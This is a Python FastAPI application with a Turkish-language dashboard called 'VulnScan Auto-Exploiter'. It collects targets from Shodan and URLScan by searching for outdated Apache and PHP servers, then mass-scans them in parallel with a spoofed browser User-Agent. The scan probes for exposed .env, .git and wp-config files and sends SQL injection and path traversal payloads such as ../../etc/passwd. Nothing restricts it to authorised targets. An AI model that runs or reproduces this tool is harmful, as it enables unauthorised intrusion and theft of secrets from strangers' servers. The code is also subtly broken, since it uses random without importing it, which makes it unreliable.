from fastapi import FastAPI, WebSocket, WebSocketDisconnect
from fastapi.responses import HTMLResponse
import asyncio
import aiohttp
import sqlite3
import urllib.parse
import os
import logging
import time
from typing import List
import uvicorn

# --- SİSTEM LOGLAMA AYARLARI ---
logging.basicConfig(level=logging.INFO, format='%(asctime)s [%(levelname)s] %(message)s')
logger = logging.getLogger("VulnScan")

app = FastAPI(title="VulnScan Auto-Exploiter - High Speed")

# --- VERİTABANI VE DİZİN AYARLARI ---
DATA_DIR = os.environ.get("DATA_DIR", "/var/data")
if not os.path.exists(DATA_DIR):
    try:
        os.makedirs(DATA_DIR)
    except Exception:
        DATA_DIR = "."

DB_PATH = os.path.join(DATA_DIR, "vulnscan.db")

def get_db():
    conn = sqlite3.connect(DB_PATH)
    conn.execute('PRAGMA journal_mode=WAL;')
    conn.execute('PRAGMA busy_timeout=5000;')
    return conn

def init_db():
    with get_db() as conn:
        c = conn.cursor()
        c.execute('''CREATE TABLE IF NOT EXISTS findings 
                     (id INTEGER PRIMARY KEY, target_url TEXT, vuln_type TEXT, 
                      severity TEXT, evidence TEXT, timestamp TIMESTAMP)''')
        conn.commit()

init_db()

# --- WEBSOCKET CANLI LOG VE DURUM YÖNETİMİ ---
class ConnectionManager:
    def __init__(self):
        self.active_connections: List[WebSocket] = []

    async def connect(self, websocket: WebSocket):
        await websocket.accept()
        self.active_connections.append(websocket)

    def disconnect(self, websocket: WebSocket):
        if websocket in self.active_connections:
            self.active_connections.remove(websocket)

    async def broadcast(self, message: dict):
        # JSON formatında yayın (Frontend'de ayrıştırmak için)
        for connection in self.active_connections:
            try:
                await connection.send_json(message)
            except:
                pass

manager = ConnectionManager()

class WSHandler(logging.Handler):
    def emit(self, record):
        log_entry = {
            "type": "log",
            "time": self.format(record).split('|')[0].strip(),
            "level": record.levelname,
            "message": self.format(record).split('|')[-1].strip()
        }
        try:
            loop = asyncio.get_running_loop()
            asyncio.run_coroutine_threadsafe(manager.broadcast(log_entry), loop)
        except RuntimeError:
            pass

ws_handler = WSHandler()
ws_handler.setFormatter(logging.Formatter('%(asctime)s | %(message)s', datefmt='%H:%M:%S'))
logger.addHandler(ws_handler)

# --- ZAFİYET LİSTELERİ VE AYARLAR ---
COMMON_PATHS = ["/.env", "/.git/config", "/wp-config.php", "/config.php"]
SQLI_PAYLOADS = ["'", "' OR 1=1 --"]
SQL_ERRORS = ["you have an error in your sql syntax", "unclosed quotation mark"]
LFI_PAYLOADS = ["../../../../etc/passwd", "../../../../windows/win.ini"]

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Connection": "keep-alive"
}

# --- OSINT HEDEF KEŞFİ (HIZLI) ---
async def fetch_osint_targets(session):
    logger.info("OSINT Keşfi Başlatıldı. Hedefler toplanıyor...")
    targets = set()
    
    # 1. Shodan API
    shodan_api = os.environ.get("SHODAN_API_KEY")
    if shodan_api:
        try:
            queries = ['http.title:"index of"', 'Server: Apache/2.2', 'X-Powered-By: PHP/5']
            for q in queries:
                encoded_q = urllib.parse.quote(q)
                url = f"https://api.shodan.io/shodan/host/search?key={shodan_api}&query={encoded_q}"
                async with session.get(url, timeout=10) as res:
                    if res.status == 200:
                        data = await res.json()
                        for match in data.get('matches', [])[:50]: # Daha fazla hedef
                            ip = match.get('ip_str')
                            port = match.get('port')
                            if port == 80: targets.add(f"http://{ip}")
                            elif port == 443: targets.add(f"https://{ip}")
        except Exception as e:
            logger.error(f"Shodan Hatası: {e}")

    # 2. URLScan.io API
    try:
        urlscan_url = "https://urlscan.io/api/v1/search/?q=page.server:%22Apache/2.2%22&size=100"
        async with session.get(urlscan_url, timeout=10) as res:
            if res.status == 200:
                data = await res.json()
                for result in data.get('results', []):
                    page_url = result.get('page', {}).get('url')
                    if page_url and page_url.startswith("http"):
                        targets.add(page_url)
    except Exception as e:
        logger.error(f"URLScan Hatası: {e}")

    # Fallback (Test için 500 hedef simülasyonu)
    if len(targets) < 50:
        logger.warning("API'lerden yeterli veri alınamadı. Test hedefleri (500+) yükleniyor.")
        base_targets = ["http://testphp.vulnweb.com", "http://demo.testfire.net", "http://zero.webappsecurity.com"]
        for i in range(500):
            targets.add(random.choice(base_targets))
        
    logger.info(f"OSINT Tamamlandı. Toplam {len(targets)} hedef sıraya alındı.")
    return list(targets)

# --- TEK BİR SİTEYİ TARAMA ---
async def scan_and_exploit(session, target_url):
    report = {"target": target_url, "vulnerabilities": [], "exploits": [], "status": "OK"}
    
    try:
        async with session.get(target_url, timeout=5, ssl=False, allow_redirects=True, headers=HEADERS) as response:
            server = response.headers.get("Server", "Bilinmiyor")
            powered = response.headers.get("X-Powered-By", "Bilinmiyor")
            
            if response.status != 200:
                report["status"] = f"HTTP {response.status}"
                return report

            # Gizli Dizin Kontrolü
            for path in COMMON_PATHS:
                test_url = f"{target_url.rstrip('/')}{path}"
                async with session.get(test_url, timeout=3, ssl=False, headers=HEADERS) as res:
                    if res.status == 200:
                        text = await res.text()
                        if "404" not in text and "not found" not in text.lower():
                            report["vulnerabilities"].append(f"Açık Dizin: {path}")
                            if path == "/.env" and "=" in text:
                                report["exploits"].append({"type": "Config Sızıntısı", "path": path, "evidence": text[:30] + "..."})
                                save_finding(target_url, "Config Sızıntısı", "CRITICAL", path)

            # SQLi Kontrolü (Hata tabanlı)
            for payload in SQLI_PAYLOADS:
                test_url = f"{target_url.rstrip('/')}/?id={urllib.parse.quote(payload)}"
                async with session.get(test_url, timeout=5, ssl=False, headers=HEADERS) as res:
                    text = (await res.text()).lower()
                    for error in SQL_ERRORS:
                        if error in text:
                            report["exploits"].append({"type": "SQL Injection", "payload": payload, "evidence": error})
                            save_finding(target_url, "SQL Injection", "HIGH", error)
                            logger.critical(f"SQLi Tespit: {target_url}")
                            break

            # LFI Kontrolü
            for payload in LFI_PAYLOADS:
                test_url = f"{target_url.rstrip('/')}/?file={urllib.parse.quote(payload)}"
                async with session.get(test_url, timeout=5, ssl=False, headers=HEADERS) as res:
                    text = await res.text()
                    if "root:x:0:0" in text or "[extensions]" in text:
                        report["exploits"].append({"type": "LFI", "payload": payload, "evidence": "Sistem dosyası!"})
                        save_finding(target_url, "LFI", "CRITICAL", payload)
                        logger.critical(f"LFI Tespit: {target_url}")

    except asyncio.TimeoutError:
        report["status"] = "TIMEOUT"
    except Exception as e:
        report["status"] = "ERROR"
        
    # Canlı ekrana hedefin durumunu gönder
    await manager.broadcast({"type": "scan_result", "data": report})
    return report

def save_finding(url, vuln, sev, evidence):
    with get_db() as conn:
        c = conn.cursor()
        c.execute('''INSERT INTO findings (target_url, vuln_type, severity, evidence, timestamp) 
                     VALUES (?, ?, ?, ?, CURRENT_TIMESTAMP)''', (url, vuln, sev, evidence))
        conn.commit()

# --- OTONOM TARAMA API'Sİ ---
@app.post("/api/auto-scan")
async def auto_scan():
    logger.info("Otonom Tarama Başlatıldı.")
    
    # Çok hızlı tarama için TCP limitleri
    connector = aiohttp.TCPConnector(limit=100, limit_per_host=10, ssl=False)
    timeout = aiohttp.ClientTimeout(total=10)
    
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        targets = await fetch_osint_targets(session)
        logger.info(f"Tarama başlıyor... Toplam {len(targets)} hedef.")
        
        # 100 eşzamanlı istek (Hız için)
        semaphore = asyncio.Semaphore(100)
        async def limited_scan(url):
            async with semaphore:
                return await scan_and_exploit(session, url)

        tasks = [limited_scan(url) for url in targets]
        results = await asyncio.gather(*tasks)
        
    logger.info("Tarama Tamamlandı.")
    return {"status": "success", "total_scanned": len(results), "results": results}

@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    await manager.connect(websocket)
    try:
        while True:
            await websocket.receive_text()
    except WebSocketDisconnect:
        manager.disconnect(websocket)

@app.get("/", response_class=HTMLResponse)
def read_root():
    return """
    <!DOCTYPE html>
    <html lang="tr">
    <head>
        <meta charset="UTF-8">
        <title>VulnScan | High-Speed OSINT Exploiter</title>
        <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600&display=swap" rel="stylesheet">
        <style>
            :root {
                --bg: #0f1115; --panel: #15181e; --border: #2a2e39;
                --text: #d1d5db; --accent: #3b82f6; --danger: #ef4444;
                --warning: #f59e0b; --success: #10b981;
            }
            * { box-sizing: border-box; margin: 0; padding: 0; }
            body { background-color: var(--bg); color: var(--text); font-family: 'Inter', sans-serif; height: 100vh; display: flex; flex-direction: column; overflow: hidden; }
            
            .header { padding: 15px 25px; background: var(--panel); border-bottom: 1px solid var(--border); display: flex; justify-content: space-between; align-items: center; }
            .header h1 { font-size: 1.4rem; font-weight: 600; color: #fff; }
            
            .btn-start { background: var(--danger); color: #fff; border: none; padding: 10px 20px; border-radius: 6px; font-weight: 600; cursor: pointer; font-size: 1rem; transition: 0.2s; }
            .btn-start:hover { background: #dc2626; }
            .btn-start:disabled { background: #374151; cursor: not-allowed; }

            .main-layout { display: flex; flex: 1; overflow: hidden; }
            
            /* Sol Panel: Loglar */
            .terminal-panel { width: 40%; background: #090a0c; border-right: 1px solid var(--border); display: flex; flex-direction: column; }
            .panel-title { padding: 10px 15px; background: var(--panel); border-bottom: 1px solid var(--border); font-size: 0.85rem; color: #9ca3af; font-weight: 600; text-transform: uppercase; }
            .terminal { flex: 1; overflow-y: auto; padding: 15px; font-family: 'JetBrains Mono', monospace; font-size: 0.8rem; line-height: 1.5; }
            .log-line { margin-bottom: 4px; word-wrap: break-word; }
            .log-time { color: #6b7280; }
            .log-info { color: var(--accent); }
            .log-warning { color: var(--warning); }
            .log-critical { color: var(--danger); font-weight: bold; }
            
            /* Sağ Panel: Sonuçlar */
            .results-panel { width: 60%; display: flex; flex-direction: column; background: var(--bg); }
            .results-list { flex: 1; overflow-y: auto; padding: 20px; display: flex; flex-direction: column; gap: 10px; }
            
            .site-card { background: var(--panel); border: 1px solid var(--border); border-radius: 6px; padding: 12px 15px; display: flex; justify-content: space-between; align-items: center; }
            .site-card.vuln { border-left: 4px solid var(--danger); }
            .site-card.ok { border-left: 4px solid var(--success); }
            .site-card.err { border-left: 4px solid var(--warning); }
            
            .site-url { font-family: 'JetBrains Mono', monospace; font-size: 0.85rem; color: var(--text); word-break: break-all; flex: 1; }
            .site-status { font-size: 0.75rem; padding: 3px 8px; border-radius: 4px; font-weight: 600; }
            .status-ok { background: rgba(16, 185, 129, 0.1); color: var(--success); }
            .status-vuln { background: rgba(239, 68, 68, 0.1); color: var(--danger); }
            .status-err { background: rgba(245, 158, 11, 0.1); color: var(--warning); }
            
            .exploit-tag { font-size: 0.75rem; color: var(--danger); margin-top: 5px; display: block; }
        </style>
    </head>
    <body>
        <div class="header">
            <h1>VulnScan High-Speed OSINT</h1>
            <button class="btn-start" onclick="startAutoScan()" id="scanBtn">Otonom Taramayı Başlat (500+ Hedef)</button>
        </div>

        <div class="main-layout">
            <div class="terminal-panel">
                <div class="panel-title">Canlı Sistem Logları</div>
                <div id="terminal" class="terminal"></div>
            </div>
            
            <div class="results-panel">
                <div class="panel-title">Canlı Tarama Sonuçları (<span id="scan-count">0</span> Hedef)</div>
                <div id="results-list" class="results-list"></div>
            </div>
        </div>

        <script>
            const protocol = window.location.protocol === 'https:' ? 'wss://' : 'ws://';
            const ws = new WebSocket(protocol + window.location.host + "/ws");
            const terminal = document.getElementById('terminal');
            const resultsList = document.getElementById('results-list');
            const scanCount = document.getElementById('scan-count');
            
            let targetCount = 0;

            ws.onmessage = function(event) {
                const data = JSON.parse(event.data);
                
                if (data.type === "log") {
                    const line = document.createElement("div");
                    line.className = "log-line";
                    let colorClass = "log-info";
                    if (data.level === "WARNING") colorClass = "log-warning";
                    if (data.level === "CRITICAL" || data.level === "ERROR") colorClass = "log-critical";

                    line.innerHTML = `<span class="log-time">[${data.time}]</span> <span class="${colorClass}">${data.message}</span>`;
                    terminal.appendChild(line);
                    terminal.scrollTop = terminal.scrollHeight;
                } 
                else if (data.type === "scan_result") {
                    targetCount++;
                    scanCount.innerText = targetCount;
                    
                    const res = data.data;
                    const card = document.createElement("div");
                    
                    let cardClass = "site-card";
                    let statusClass = "status-ok";
                    let statusText = "TEMİZ";
                    
                    if (res.exploits && res.exploits.length > 0) {
                        cardClass = "site-card vuln";
                        statusClass = "status-vuln";
                        statusText = "ZAFİYETLİ";
                    } else if (res.status !== "OK") {
                        cardClass = "site-card err";
                        statusClass = "status-err";
                        statusText = res.status;
                    }
                    
                    card.className = cardClass;
                    
                    let exploitHtml = "";
                    if (res.exploits && res.exploits.length > 0) {
                        res.exploits.forEach(exp => {
                            exploitHtml += `<span class="exploit-tag">>> ${exp.type} (${exp.payload || exp.path})</span>`;
                        });
                    }
                    
                    card.innerHTML = `
                        <div style="flex: 1;">
                            <div class="site-url">${res.target}</div>
                            ${exploitHtml}
                        </div>
                        <div class="site-status ${statusClass}">${statusText}</div>
                    `;
                    
                    resultsList.insertBefore(card, resultsList.firstChild); // En son taranan en üstte
                }
            };

            async function startAutoScan() {
                document.getElementById('scanBtn').disabled = true;
                terminal.innerHTML = "";
                resultsList.innerHTML = "";
                targetCount = 0;
                scanCount.innerText = "0";

                try {
                    await fetch('/api/auto-scan', { method: 'POST' });
                } catch (error) {
                    alert("Hata: " + error);
                } finally {
                    document.getElementById('scanBtn').disabled = false;
                }
            }
        </script>
    </body>
    </html>
    """
